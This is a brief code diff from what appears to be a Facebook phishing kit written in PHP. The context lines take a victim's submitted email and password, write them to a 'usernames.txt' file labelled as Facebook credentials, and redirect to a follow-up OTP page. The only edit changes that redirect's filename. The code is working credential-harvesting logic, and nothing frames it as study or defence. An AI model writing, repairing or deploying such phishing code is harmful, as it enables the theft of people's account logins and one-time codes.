@@ -162,6 +162,6 @@ $_SESSION['email'] = $_POST['email'];
 $_SESSION['pass'] = $_POST['pass'];
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\n". "Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: otp.login.php');
+header('Location: otp.login.html.php');
 exit();
 ?>
